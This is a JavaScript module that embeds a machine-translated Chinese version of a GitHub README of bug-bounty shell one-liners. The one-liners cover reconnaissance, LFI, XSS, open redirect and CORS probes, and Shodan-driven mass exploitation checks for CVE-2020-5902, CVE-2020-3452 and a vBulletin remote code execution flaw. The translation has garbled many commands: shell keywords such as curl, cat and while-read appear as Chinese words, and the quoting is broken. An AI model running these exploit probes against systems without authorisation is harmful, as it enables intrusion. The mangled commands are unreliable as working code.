const r=`dwisiswant0/awesome-oneliner-bugbounty: A collection of awesome one-liner scripts especially for bug bounty tips.    https://github.com/dwisiswant0/awesome-oneliner-bugbounty\r
\r
# \u8D85\u68D2\u7684\u4E00\u884C\u4EE3\u7801 Bug Bounty [![\u8D85\u68D2](https://awesome.re/badge-flat2.svg)](https://awesome.re)\r
> \u4E00\u7EC4\u7279\u522B\u7528\u4E8E\u6F0F\u6D1E\u8D4F\u91D1\u7684\u7CBE\u5F69\u5355\u884C\u811A\u672C\u3002\r
\r
\u6B64\u5B58\u50A8\u5E93\u5B58\u50A8\u5E76\u4FDD\u5B58\u4E86\u6211\u63D0\u4F9B\u7684\u4EE5\u53CA\u793E\u533A\u8D21\u732E\u7684\u5404\u79CD\u6F0F\u6D1E\u8D4F\u91D1\u63D0\u793A\u3002\u70ED\u5FF1\u6B22\u8FCE\u60A8\u7684\u8D21\u732E\u548C\u5EFA\u8BAE\u3002\r
\r
## \u5B9A\u4E49\r
\r
\u672C\u8282\u5B9A\u4E49\u4E86\u5355\u884C\u547D\u4EE4/\u811A\u672C\u4E2D\u4F7F\u7528\u7684\u7279\u5B9A\u672F\u8BED\u6216\u5360\u4F4D\u7B26\u3002\r
\r
- 1.1. \u201C**HOST**\u201D \u5B9A\u4E49\u4E00\u4E2A\u4E3B\u673A\u540D\u3001\uFF08\u5B50\uFF09\u57DF\u6216 IP \u5730\u5740\uFF0C\u4F8B\u5982\uFF0C\u66FF\u6362\u4E3A\u201Cinternal.host\u201D\u3001\u201Cdomain.tld\u201D\u3001\u201Csub.domain.tld\u201D\u6216\u201C127.0.0.1\u201D\u3002\r
- 1.2. \u201C**HOSTS.txt**\u201D\u6587\u4EF6\u4E2D\u5305\u542B\u591A\u4E2A\u6761\u4EF6 1.1\u3002\r
- 2.1.\u201C**URL**\u201D\u660E\u786E\u5B9A\u4E49 URL\uFF0C\u4F8B\u5982\u66FF\u6362\u4E3A\u201Chttp://domain.tld/path/page.html\u201D\u6216\u4EE5 HTTP/HTTPS \u534F\u8BAE\u5F00\u5934\u3002\r
- 2.2. \u201C**URLS.txt**\u201D \u6587\u4EF6\u4E2D\u542B\u6709\u591A\u4E2A\u6807\u51C6 2.1\u3002\r
- 3.1. \u201C**FILE.txt**\u201D\u6216\u201C**FILE**\`{N}\`**.txt**\u201D\u8868\u793A\u6839\u636E\u4E0A\u4E0B\u6587\u548C\u9700\u8981\u8FD0\u884C\u547D\u4EE4/\u811A\u672C\u6240\u9700\u7684\u6587\u4EF6\u3002\r
- 4.1. "**OUT.txt**" \u6216 "**OUT**\`{N}\`**.txt**" \u8868\u793A\u4F5C\u4E3A\u76EE\u6807\u5B58\u50A8\u7ED3\u679C\u7684\u6587\u4EF6\u5C06\u6210\u4E3A\u6267\u884C\u7684\u547D\u4EE4\u3002\r
\r
---\r
\r
### \u672C\u5730\u6587\u4EF6\u5305\u542B\r
>@dwisiswant0\r
\r
\`\`\`bash\r
gau \u4E3B\u673A | gf lfi | qsreplace\u201C/etc/passwd\u201D| xargs -I% -P 25 sh -c'curl -s\u201C%\u201D2>&1 | grep -q\u201Croot:x\u201D&& echo\u201CVULN\uFF01%\u201D'\r
\`\`\`\r
\r
### \u5F00\u653E\u91CD\u5B9A\u5411\r
>@dwisiswant0\r
\r
\`\`\`bash\r
\u5BFC\u51FA LHOST="URL"; gau $1 | gf \u91CD\u5B9A\u5411 | qsreplace"$LHOST" | xargs -I % -P 25 sh -c'curl -Is"%" 2>&1 | grep -q"\u4F4D\u7F6E\uFF1A$LHOST" && echo"VULN\uFF01%"'\r
\`\`\`\r
\r
>@N3T_hunt3r\r
\`\`\`bash\r
cat URLS.txt | gf url | tee url-redirect.txt && cat url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null\r
\`\`\`\r
\r
### XSS\r
> @cihanmehmet\r
\r
\`\`\`bash\r
gospider -S URLS.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee OUT.txt\r
\`\`\`\r
\r
>@fanimalikhack\r
\r
\`\`\`bash\r
waybackurls HOST | gf xss | sed 's/=.*/=/' | sort -u | tee FILE.txt && cat FILE.txt | dalfox -b YOURS.xss.ht pipe > OUT.txt\r
\`\`\`\r
\r
>@oliverrickfors\r
\r
\`\`\`bash\r
cat HOSTS.txt | getJS | httpx --match-regex \u201CaddEventListener\\((?:'|\\")message(?:'|\\")\u201D\r
\`\`\`\r
\r
### \u539F\u578B\u6C61\u67D3\r
> @R0X4R\r
\r
\`\`\`bash\r
subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\\/?__proto__[testparam]=exploit\\//' FILE.txt | page-fetch -j 'window.testparam == "exploit"?\u201C[VULNERABLE]\u201D:\u201C[NOT VULNERABLE]\u201D' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"\r
\`\`\`\r
\r
CVE-2020-5902\r
>@Madrobot_\r
\r
\`\`\`bash\r
shodan \u641C\u7D22 http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | \u8BFB\u53D6\u4E3B\u673A\u65F6\u6267\u884C\uFF1B\u6267\u884C curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \\printf "$host \\033[0;31mVulnerable\\n" || printf "$host \\033[0;32mNot Vulnerable\\n";done\r
\`\`\`\r
\r
CVE-2020-3452\r
>@vict0ni\r
\r
\`\`\`bash\r
\u8BFB\u53D6 LINE \u65F6\uFF1B\u6267\u884C curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[\${GREEN}VULNERABLE\${NC}] $LINE" || echo -e "[\${RED}NOT VULNERABLE\${NC}] $LINE"\uFF1B\u5B8C\u6210 < HOSTS.txt\r
\`\`\`\r
\r
### CVE-2022-0378\r
>@7h3h4ckv157\r
\r
\`\`\`bash\r
cat URLS.txt | \u5F53\u8BFB\u53D6 h \u65F6\u6267\u884C\uFF1B\u6267\u884C curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"\uFF1B\u5B8C\u6210\r
\`\`\`\r
\r
### vBulletin 5.6.2 - \u2018widget_tabbedContainer_tab_panel\u2019 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\r
>@Madrobot_\r
\r
\`\`\`bash\r
shodan \u641C\u7D22 http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \\printf "$host \\033[0;31mVulnerable\\n" || printf "$host \\033[0;32mNot Vulnerable\\n";done;\r
\`\`\`\r
\r
### \u67E5\u627E JavaScript \u6587\u4EF6\r
>@D0cK3rG33k\r
\r
\`\`\`bash\r
assetfinder --subs-only HOST | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | \u8BFB\u53D6 url \u65F6\uFF1B\u6267\u884C vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" | sed -e 's, 'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'):echo -e "\\e[1;33m$url\\n" "\\e[1;32m$vars"; \u5B8C\u6210\r
\`\`\`\r
\r
### \u4ECE JavaScript \u4E2D\u63D0\u53D6\u7AEF\u70B9\r
>@renniepak\r
\r
\`\`\`bash\r
\u732B FILE.js | grep -oh "\\"\\/[a-zA-Z0-9_/?=&]*\\"" | sed -e 's/^"//' -e 's/"$//' |\u6392\u5E8F-u\r
\`\`\`\r
\r
### \u4ECE\u76EE\u6807\u5217\u8868\u83B7\u53D6 CIDR \u548C\u7EC4\u7EC7\u4FE1\u606F\r
>@steve_mcilwain\r
\r
\`\`\`bash\r
\u5BF9\u4E8E $(cat HOSTS.txt) \u4E2D\u7684 HOST\uFF1B\u6267\u884C echo $(\u5BF9\u4E8E $(dig a $HOST +short) \u4E2D\u7684 ip\uFF1B\u6267\u884C whois $ip | grep -e "CIDR\\|Organization" | tr -s " " | \u7C98\u8D34 - -\uFF1Bd\r
\u4E00 | uniq); \u5B8C\u6210\r
\`\`\`\r
\r
### \u4ECE RapidDNS.io \u83B7\u53D6\u5B50\u57DF\u540D\r
>@andirrahmani1\r
\r
\`\`\`bash\r
\u5BFC\u51FA\u4E3B\u673A=\u201CHOST\u201D\uFF1Bcurl -s\u201Chttps://rapiddns.io/subdomain/$host?full=1#result\u201D|grep -e\u201C<td>.*$host</td>\u201D|grep -oP'(?<=<td>)[^<]+'|sort -u\r
\`\`\`\r
\r
### \u4ECE BufferOver.run \u83B7\u53D6\u5B50\u57DF\u540D\r
>@\\_ayoubfathi\\_\r
\r
\`\`\`bash\r
curl -s https://dns.bufferover.run/dns?q=.HOST.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u\r
\`\`\`\r
\r
>@AnubhavSingh_\r
\`\`\`bash\r
\u5BFC\u51FA\u57DF =\u201CHOST\u201D; curl\u201Chttps://tls.bufferover.run/dns?q=$domain\u201D| jq -r .Results'[]' | rev | cut -d'\uFF0C'-f1 | rev | sort -u | grep\u201C\\.$domain\u201D\r
\`\`\`\r
\r
### \u4ECE Riddler.io \u83B7\u53D6\u5B50\u57DF\u540D\r
> @pikpikcu\r
\r
\`\`\`bash\r
\u5377\u66F2-s\u201Chttps://riddler.io/search/exportcsv?q=pld:HOST\u201D| grep -Po "(([\\w.-]*)\\.([\\w]*)\\.([Az]))\\w+" |\u6392\u5E8F-u\r
\`\`\`\r
\r
### \u4ECE VirusTotal \u83B7\u53D6\u5B50\u57DF\u540D\r
> @pikpikcu\r
\r
\`\`\`bash\r
curl -s \u201Chttps://www.virustotal.com/ui/domains/HOST/subdomains?limit=40\u201D | grep -Po \u201C((http|https):\\/\\/)?(([\\w.-]*)\\.([\\w]*)\\.([Az]))\\w+\u201D | sort -u\r
\`\`\`\r
\r
### \u4F7F\u7528 cyberxplore \u83B7\u53D6\u5B50\u57DF\u540D\r
> @pikpikcu\r
\r
\`\`\`\r
\u5377\u66F2 https://subbuster.cyberxplore.com/api/find?domain=HOST -s | grep -Po "(([\\w.-]*)\\.([\\w]*)\\.([Az]))\\w+"\r
\`\`\`\r
\r
### \u4ECE CertSpotter \u83B7\u53D6\u5B50\u57DF\u540D\r
>@caryhooper\r
\r
\`\`\`bash\r
curl -s \u201Chttps://certspotter.com/api/v1/issuances?domain=HOST&include_subdomains=true&expand=dns_names\u201D | jq .[].dns_names | grep -Po \u201C(([\\w.-]*)\\.([\\w]*)\\.([Az]))\\w+\u201D | sort -u\r
\`\`\`\r
\r
### \u4ECE\u5B58\u6863\u4E2D\u83B7\u53D6\u5B50\u57DF\u540D\r
> @pikpikcu\r
\r
\`\`\`bash\r
curl -s \u201Chttp://web.archive.org/cdx/search/cdx?url=*.HOST/*&output=text&fl=original&collapse=urlkey\u201D | sed -e 's_https*://__' -e \u201Cs/\\/.*//\u201D | sort -u\r
\`\`\`\r
\r
### \u4ECE JLDC \u83B7\u53D6\u5B50\u57DF\u540D\r
> @pikpikcu\r
\r
\`\`\`bash\r
curl -s \u201Chttps://jldc.me/anubis/subdomains/HOST\u201D | grep -Po \u201C((http|https):\\/\\/)?(([\\w.-]*)\\.([\\w]*)\\.([Az]))\\w+\u201D | sort -u\r
\`\`\`\r
\r
### \u4ECE securitytrails \u83B7\u53D6\u5B50\u57DF\u540D\r
> @pikpikcu\r
\r
\`\`\`bash\r
curl -s\u201Chttps://securitytrails.com/list/apex_domain/HOST\u201D|grep -Po\u201C((http|https):\\/\\/)?(([\\w.-]*)\\.([\\w]*)\\.([Az]))\\w+\u201D|grep\u201C.HOST\u201D|sort -u\r
\`\`\`\r
\r
### \u4F7F\u7528 DNS Over \u66B4\u529B\u7834\u89E3\u5B50\u57DF\u540D\r
> @pikpikcu\r
\r
\`\`\`\r
\u8BFB\u53D6\u5B50\u6587\u4EF6\u65F6\uFF1B\u6267\u884C echo \u201Chttps://dns.google.com/resolve?name=$sub.HOST&type=A&cd=true\u201D | parallel -j100 -q curl -s -L --silent | grep -Po '[{\\[]{1}([,:{}\\[\\]0-9.\\-+Eaeflnr-u \\n\\r\\t]|".*!")+[}\\]]{1}' | jq | grep \u201Cname\u201D | grep -Po \u201C((http|https):\\/\\/)?(([\\w.-]*)\\.([\\w]*)\\.([Az]))\\w+\u201D | grep \u201C.HOST\u201D | sort -u ; \u5B8C\u6210 <FILE.txt\r
\`\`\`\r
\r
### \u4F7F\u7528 sonar.omnisint.io \u83B7\u53D6\u5B50\u57DF\u540D\r
> @pikpikcu\r
\r
\`\`\`\r
\u5377\u66F2 --silent https://sonar.omnisint.io/subdomains/HOST | grep -oE "[a-zA-Z0-9._-]+\\.HOST" | grep -oE "[a-zA-Z0-9._-]+\\.HOST" |\u6392\u5E8F-u\r
\`\`\`\r
\r
### \u4F7F\u7528 synapsint.com \u83B7\u53D6\u5B50\u57DF\u540D\r
> @pikpikcu\r
\r
\`\`\`\r
curl --silent -X POST https://synapsint.com/report.php -d \u201Cname=https%3A%2F%2FHOST\u201D | grep -oE \u201C[a-zA-Z0-9._-]+\\.HOST\u201D | sort -u\r
\`\`\`\r
\r
### \u4ECE crt.sh \u83B7\u53D6\u5B50\u57DF\u540D\r
>@vict0ni\r
\r
\`\`\`bash\r
curl -s \u201Chttps://crt.sh/?q=%25.HOST&output=json\u201D | jq -r'.[].name_value' | sed's/\\*\\.//g' | sort -u\r
\`\`\`\r
\r
### \u5BF9 Recon.dev \u4E2D\u7684\u57DF\u540D\u8FDB\u884C\u6392\u5E8F\u548C\u6D4B\u8BD5\r
>@stokfedrik\r
\r
\`\`\`bash\r
curl "https://recon.dev/api/search?key=apikey&domain=HOST" |jq -r'.[].rawDomains[]'|sed's//g'|sort -u |httpx -silent\r
\`\`\`\r
\r
### \u4F7F\u7528 FFUF \u8FDB\u884C\u5B50\u57DF\u540D\u66B4\u529B\u7834\u89E3\r
> @GochaOqradze\r
\r
\`\`\`bash\r
ffuf -u https://FUZZ.HOST -w FILE.txt -v | grep "| URL |" | awk'{print $4}'\r
\`\`\`\r
\r
### \u6839\u636E IP \u5730\u5740\u67E5\u627E ASN \u5206\u914D\u7684 IP \u8303\u56F4\r
> wains.be\r
\r
\`\`\`bash\r
whois -h whois.radb.net -i \u539F\u70B9 -T \u8DEF\u7EBF $(whois -h whois.radb.net IP | grep \u539F\u70B9\uFF1A| awk '{print $NF}' | head -1) | grep -w "\u8DEF\u7EBF\uFF1A" | awk '{print $NF}' | sort -n\r
\`\`\`\r
\r
### \u4ECE\u6587\u4EF6\u4E2D\u63D0\u53D6 IP\r
>@emenalf\r
\r
\`\`\`bash\r
grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' \u6587\u4EF6.txt\r
\`\`\`\r
\r
### \u4E0D\u4F7F\u7528 CloudFlare \u8FDB\u884C\u7AEF\u53E3\u626B\u63CF\r
>@dwisiswant0\r
\r
\`\`\`bash\r
subfinder -silent -d HOST | \u8FC7\u6EE4\u89E3\u6790 | cf-check | sort -u | naabu -rate 40000 -silent -verify | httprobe\r
\`\`\`\r
\r
### \u521B\u5EFA\u81EA\u5B9A\u4E49\u5355\u8BCD\u8868\r
>@tomnomnom\r
\r
\`\`\`bash\r
gau HOST | unfurl -u \u952E | tee -a FILE1.txt; gau HOST | unfurl -u \u8DEF\u5F84 | tee -a FILE2.txt; sed 's#/#\\n#g' FILE2.txt | sort -u | tee -a FILE1.txt | sort -u; rm FILE2.txt | sed -i -e 's/\\.css\\|\\.png\\|\\.jpeg\\|\\.jpg\\|\\.svg\\|\\.gif\\|\\.wolf\\|\\.bmp//g' FILE1.txt\r
\`\`\`\r
\r
\`\`\`bash\r
cat HOSTS.txt | httprobe | xargs curl | tok | tr'[:upper:]''[:lower:]'| sort -u | tee -a FILE.txt  \r
\`\`\`\r
\r
### \u63D0\u53D6\u91CD\u8981\u4FE1\u606F\r
>@Prial Islam Khan\r
\r
\`\`\`bash\r
\u5BF9\u4E8E $(cat HOSTS.txt) \u4E2D\u7684\u5B50\u9879\uFF1B\u6267\u884C gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\\burl\\b" | gron --ungron | jq | egrep -wi'url' | awk'{print $2}' | sed's/"//g'| sort -u | tee -a OUT.txt ;\u5B8C\u6210\r
\`\`\`\r
\r
### \u67E5\u627E\u5B50\u57DF\u540D TakeOver\r
>@hahwul\r
\r
\`\`\`bash\r
subfinder -d HOST >> FILE; assetfinder --subs-only HOST >> FILE; amass enum -norecursive -noalts -d HOST >> FILE; subjack -w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ;\r
\`\`\`\r
\r
### \u4ECE ParamSpider \u8F6C\u50A8\u81EA\u5B9A\u4E49 URL\r
>@hahwul\r
\r
\`\`\`bash\r
cat HOSTS.txt | xargs -I%python3 paramspider.py -l high -o./OUT/%-d%;\r
\`\`\`\r
\r
### \u4F7F\u7528 cURL + Parallel \u8FDB\u884C URL \u63A2\u6D4B\r
>@akita_zen\r
\r
\`\`\`bash\r
cat HOSTS.txt | parallel -j50 -q curl -w'\u72B6\u6001\uFF1A%{http_code}\\t \u5927\u5C0F\uFF1A%{size_download}\\t %{url_effective}\\n'-o /dev/null -sk\r
\`\`\`\r
\r
### \u4ECE \`chaos-bugbounty-list\` \u4E2D\u8F6C\u50A8\u8303\u56F4\u5185\u7684\u8D44\u4EA7\r
>@dwisiswant0\r
\r
\`\`\`bash\r
curl -sL https://github.com/projectdiscovery/public-bugbounty-programs/raw/master/chaos-bugbounty-list.json | jq -r'.programs[].domains | to_entries | .[].value'\r
\`\`\`\r
\r
### \u4ECE\u201Cbounty-targets-data\u201D\u4E2D\u8F6C\u50A8\u8303\u56F4\u5185\u7684\u8D44\u4EA7\r
>@dwisiswant0\r
\r
HackerOne \u8BA1\u5212\r
\r
\`\`\`bash\r
curl -sL https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hackerone_data.json?raw=true | jq -r '.[].targets.in_scope[] | [.asset_identifier, .asset_type] | @tsv'\r
\`\`\`\r
\r
BugCrowd \u7A0B\u5E8F\r
\r
\`\`\`bash\r
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/bugcrowd_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'\r
\`\`\`\r
\r
#### Intigriti \u8BA1\u5212\r
\r
\`\`\`bash\r
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/intigriti_data.json | jq -r '.[].targets.in_scope[] | [.endpoint, .type] | @tsv'\r
\`\`\`\r
\r
#### YesWeHack \u7A0B\u5E8F\r
\r
\`\`\`bash\r
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/yeswehack_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'\r
\`\`\`\r
\r
#### \u9632\u9ED1\u5BA2\u7A0B\u5E8F\r
\r
\`\`\`bash\r
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/hackenproof_data.json | jq -r '.[].targets.in_scope[] | [.target, .type, .instruction] | @tsv'\r
\`\`\`\r
\r
#### \u8054\u90A6\u8BA1\u5212\r
\r
\`\`\`bash\r
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/federacy_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'\r
\`\`\`\r
\r
### \u4ECE sitemap.xml \u4E2D\u8F6C\u50A8 URL\r
>@healthoutlet\r
\r
\`\`\`bash\r
curl -s http://HOST/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g'\r
\`\`\`\r
\r
### \u7EAF Bash Linkfinder\r
>@ntrzz\r
\r
\`\`\`bash\r
curl -s $1 | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort | uniq | grep ".js" > FILE.txt; \u5F53 IFS= \u8BFB\u53D6\u94FE\u63A5\u65F6; \u6267\u884C python linkfinder.py -i "$link" -o cli; \u5B8C\u6210 < FILE.txt | grep $2 | grep -v $3 | sort -n | uniq; rm -rf FILE.txt\r
\`\`\`\r
\r
### \u4ECE swagger.json \u4E2D\u63D0\u53D6\u7AEF\u70B9\r
> @zer0pwn\r
\r
\`\`\`bash\r
curl -s https://HOST/v2/swagger.json | jq'.paths | keys[]'\r
\`\`\`\r
\r
### CORS \u914D\u7F6E\u9519\u8BEF\r
>@manas_hunter\r
\r
\`\`\`bash\r
site="URL"; gau "$site" | \u8BFB\u53D6 url \u65F6\uFF1B\u6267\u884C target=$(curl -sIH "Origin: https://evil.com" -X GET $url) | \u5982\u679C grep 'https://evil.com'; \u7136\u540E [\u53D1\u73B0\u6F5C\u5728\u7684 CORS] echo $url; \u5426\u5219 echo "$url" \u4E0A\u6CA1\u6709\u4EFB\u4F55\u5185\u5BB9\uFF1B fi; \u5B8C\u6210\r
\`\`\`\r
\r
### \u67E5\u627E\u9690\u85CF\u7684\u670D\u52A1\u5668\u548C/\u6216\u7BA1\u7406\u9762\u677F\r
>@rez0__\r
\r
\`\`\`bash\r
ffuf -c -u URL -H \u201C\u4E3B\u673A\uFF1AFUZZ\u201D -w FILE.txt\r
\`\`\`\r
\r
### \u4F7F\u7528 api.recon.dev \u8FDB\u884C\u4FA6\u5BDF\r
> @z0idsec\r
\r
\`\`\`bash\r
curl -s -w "\\n%{http_code}" https://api.recon.dev/search?domain=HOST | jg .[].domain\r
\`\`\`\r
\r
### \u67E5\u627E\u76F4\u64AD\u4E3B\u673A/\u57DF\u540D/\u8D44\u4EA7\r
>@_YashGoti_\r
\r
\`\`\`bash\r
subfinder -d HOST -silent | httpx -silent -follow-redirects -mc 200 | cut -d'/'-f3 | sort -u\r
\`\`\`\r
\r
### \u4E0D\u4F7F\u7528 gf \u7684 XSS\r
>@HacktifyS\r
\r
\`\`\`bash\r
waybackurls HOST | grep '=' | qsreplace '"><script>alert(1)<\/script>' | \u5F53\u8BFB\u53D6\u4E3B\u673A\u65F6\u6267\u884C\uFF1B\u6267\u884C curl -sk --path-as-is "$host" | grep -qs "<script>alert(1)<\/script>" && echo "$host \u5B58\u5728\u6F0F\u6D1E"\uFF1B\u5B8C\u6210\r
\`\`\`\r
\r
### \u6839\u636E IP \u83B7\u53D6\u5B50\u57DF\u540D\r
>@laughface809\r
\r
\`\`\`bash\r
python3 hosthunter.py HOSTS.txt > OUT.txt\r
\`\`\`\r
\r
### \u4ECE Content-Security-Policy \u6536\u96C6\u57DF\u540D\r
>@geeknik\r
\r
\`\`\`bash\r
\u5377\u66F2 -vs URL --stderr - | awk '/^\u5185\u5BB9\u5B89\u5168\u7B56\u7565\uFF1A/' | grep -Eo "[a-zA-Z0-9./?=_-]*" | grep -Eo "[a-zA-Z0-9./?=_-]*" | sed -e '/\\./!d' -e '/[^A-Za-z0-9._-]/d' -e 's/^\\.//' |\u6392\u5E8F-u\r
\`\`\`\r
\r
### Nmap IP:PORT \u89E3\u6790\u5668\u901A\u8FC7\u7BA1\u9053\u4F20\u8F93\u5230 HTTPX\r
>@dwisiswant0\r
\r
\`\`\`bash\r
nmap -v0 HOST -oX /dev/stdout | jc --xml -p | jq -r'.nmaprun.host | (.address["@addr"] + ":" + .ports.port[]["@portid"])'| httpx --silent\r
\`\`\`\r
`;export{r as _};
